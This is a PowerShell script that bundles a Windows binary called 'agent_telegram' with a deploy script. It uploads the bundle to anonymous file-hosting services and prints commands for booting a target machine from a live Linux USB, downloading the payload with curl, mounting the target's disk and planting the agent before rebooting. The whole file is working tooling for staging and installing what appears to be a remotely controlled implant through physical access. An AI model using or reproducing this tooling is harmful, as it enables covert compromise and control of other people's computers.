# ============================================================================
# upload_payload.ps1
#
# Bundles the agent + deploy script + (optional) install.cmd into a single
# zip, then uploads it to a public download URL. The URL is what you put
# into the deploy command on the target's live Linux USB.
#
# Usage
# -----
#   .\upload_payload.ps1
#       -Agent "build\agent_telegram_prod.exe" `
#       -Deploy "deploy_telegram.sh" `
#       -InstallCmd "install.cmd"
#
#   .\upload_payload.ps1 -Agent "build\agent_telegram_prod.exe"
#       (just the agent, no zip)
#
# Service order (tries each in turn; first success wins):
#   1. transfer.sh       -- direct download, ~14 days retention
#   2. 0x0.st            -- direct download, ~24-72h retention
#   3. file.io           -- direct download, ONE download then deleted
#   4. catbox.moe        -- permanent, but slow upload
#
# Output: prints the final URL on stdout. Copy it to the deploy command.
#
# Requirements
# ------------
#   PowerShell 5+ and either curl.exe (built into Win10+ in System32) or
#   Invoke-RestMethod. 7-Zip is used to build the zip if present; falls
#   back to .NET's [System.IO.Compression.ZipFile] otherwise.
# ============================================================================

param(
    [Parameter(Mandatory=$true)] [string]$Agent,
    [string]$Deploy  = "deploy_telegram.sh",
    [string]$InstallCmd = "install.cmd",
    [string]$OutputZip = $null,
    [int]$MaxTries = 4
)

$ErrorActionPreference = "Stop"
$ProjectDir = $PSScriptRoot
$WorkDir    = Join-Path $env:TEMP "sentinel_upload_$PID"

if (-not (Test-Path $Agent)) {
    throw "agent binary not found: $Agent"
}
$AgentAbs = (Resolve-Path $Agent).Path

if (-not $OutputZip) {
    $OutputZip = Join-Path $env:TEMP ("sentinel_payload_" +
        (Get-Date -Format "yyyyMMdd_HHmmss") + ".zip")
}

# ---- Prep workdir -----------------------------------------------------------
if (Test-Path $WorkDir) { Remove-Item -Recurse -Force $WorkDir }
New-Item -ItemType Directory -Path $WorkDir | Out-Null

# Always include the agent
Copy-Item $AgentAbs (Join-Path $WorkDir "agent_telegram.exe")
if (Test-Path $Deploy) {
    Copy-Item (Resolve-Path $Deploy).Path (Join-Path $WorkDir "deploy_telegram.sh")
} else {
    Write-Host "[!] $Deploy not found, skipping (zip will only contain the agent)" -ForegroundColor Yellow
}
if ($InstallCmd -and (Test-Path $InstallCmd)) {
    Copy-Item (Resolve-Path $InstallCmd).Path (Join-Path $WorkDir "install.cmd")
}

# ---- Build the zip ---------------------------------------------------------
Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
Write-Host "[*] Building $OutputZip ..." -ForegroundColor Cyan
[System.IO.Compression.ZipFile]::CreateFromDirectory($WorkDir, $OutputZip)

# Also keep an "agent-only" copy for single-file uploads
$AgentOnly = Join-Path $env:TEMP ("agent_telegram_" +
    (Get-Date -Format "yyyyMMdd_HHmmss") + ".exe")
Copy-Item $AgentAbs $AgentOnly

# ---- Upload ----------------------------------------------------------------
# Returns a hashtable @{ service=...; url=...; expires=... }
function Upload-File {
    param([string]$LocalPath, [string]$Service)
    switch ($Service) {
        "transfer" {
            $url = "https://transfer.sh/" + [uri]::EscapeDataString((Split-Path -Leaf $LocalPath))
            $r  = curl.exe -sS --upload-file $LocalPath $url
            return $r
        }
        "0x0" {
            # 0x0.st: -F file=@<path>
            $r = curl.exe -sS -F "file=@$LocalPath" "https://0x0.st"
            return $r
        }
        "fileio" {
            # file.io: -F file=@<path> (returns JSON with success link)
            $r = curl.exe -sS -F "file=@$LocalPath" "https://file.io"
            return $r
        }
        "catbox" {
            # catbox.moe: -F reqtype=fileupload -F fileToUpload=@<path>
            $r = curl.exe -sS -F "reqtype=fileupload" -F "fileToUpload=@$LocalPath" "https://catbox.moe/user/api.php"
            return $r
        }
    }
}

function Try-Upload-Services {
    param([string]$LocalPath, [string[]]$Services, [string]$Label)
    foreach ($svc in $Services) {
        try {
            Write-Host "[*] uploading $Label via $svc ..." -ForegroundColor Cyan
            $result = Upload-File -LocalPath $LocalPath -Service $svc
            if ([string]::IsNullOrWhiteSpace($result)) {
                Write-Host "    [no response, trying next]" -ForegroundColor Yellow
                continue
            }
            # transfer.sh / 0x0.st / catbox return a URL directly
            if ($result -match '^https?://\S+$') {
                $expires = switch ($svc) {
                    "transfer" { "~14 days" }
                    "0x0"      { "~24-72 hours" }
                    "catbox"   { "permanent" }
                    default    { "unknown" }
                }
                return @{ Service = $svc; Url = $result.Trim(); Expires = $expires }
            }
            # file.io returns JSON
            if ($result -match '"link"\s*:\s*"(https?://[^"]+)"') {
                return @{ Service = $svc; Url = $matches[1]; Expires = "one download only" }
            }
            Write-Host "    [unexpected response: $result]" -ForegroundColor Yellow
        } catch {
            Write-Host "    [failed: $($_.Exception.Message)]" -ForegroundColor Yellow
        }
    }
    return $null
}

Write-Host ""
Write-Host "[+] payload zip:   $OutputZip ($([math]::Round((Get-Item $OutputZip).Length / 1024, 1)) KB)" -ForegroundColor Green
Write-Host "[+] agent alone:   $AgentOnly ($([math]::Round((Get-Item $AgentOnly).Length / 1024, 1)) KB)" -ForegroundColor Green
Write-Host ""

# Try uploading the zip first
$zipResult = Try-Upload-Services -LocalPath $OutputZip -Services @("transfer","0x0","catbox","fileio") -Label "zip"
if ($zipResult) {
    Write-Host ""
    Write-Host "[+] ZIP URL (use this on the live Linux USB):" -ForegroundColor Green
    Write-Host "    $($zipResult.Url)" -ForegroundColor White -BackgroundColor DarkGreen
    Write-Host "    (service: $($zipResult.Service), expires: $($zipResult.Expires))" -ForegroundColor Gray
    Write-Host ""
    Write-Host "    Deploy command on the target's live Linux USB:"
    Write-Host "      sudo -i"
    Write-Host "      curl -fsSL -o /tmp/payload.zip '$($zipResult.Url)'"
    Write-Host "      lsblk -f"
    Write-Host "      mkdir -p /mnt/target"
    Write-Host "      mount /dev/sdXN /mnt/target"
    Write-Host "      unzip -o /tmp/payload.zip -d /tmp/"
    Write-Host "      bash /tmp/deploy_telegram.sh /dev/sdXN --agent /tmp/agent_telegram.exe"
    Write-Host "      umount /mnt/target"
    Write-Host "      reboot"
}

# Also try uploading the agent alone
$agentResult = Try-Upload-Services -LocalPath $AgentOnly -Services @("transfer","0x0","catbox","fileio") -Label "agent-only"
if ($agentResult) {
    Write-Host ""
    Write-Host "[+] Agent-only URL (use this with --agent=<URL>):" -ForegroundColor Green
    Write-Host "    $($agentResult.Url)" -ForegroundColor White -BackgroundColor DarkGreen
    Write-Host "    (service: $($agentResult.Service), expires: $($agentResult.Expires))" -ForegroundColor Gray
    Write-Host ""
    Write-Host "    Deploy command (downloads the agent at deploy time):"
    Write-Host "      sudo -i"
    Write-Host "      lsblk -f"
    Write-Host "      mkdir -p /mnt/target"
    Write-Host "      mount /dev/sdXN /mnt/target"
    Write-Host "      # save the deploy_telegram.sh once at the top of the engagement"
    Write-Host "      bash deploy_telegram.sh /dev/sdXN --agent '$($agentResult.Url)'"
    Write-Host "      umount /mnt/target"
    Write-Host "      reboot"
}

# Cleanup
Remove-Item -Recurse -Force $WorkDir
Remove-Item -Force $AgentOnly

if (-not $zipResult -and -not $agentResult) {
    Write-Host ""
    Write-Host "[!] all upload services failed - try again or use a different host" -ForegroundColor Red
    exit 1
}
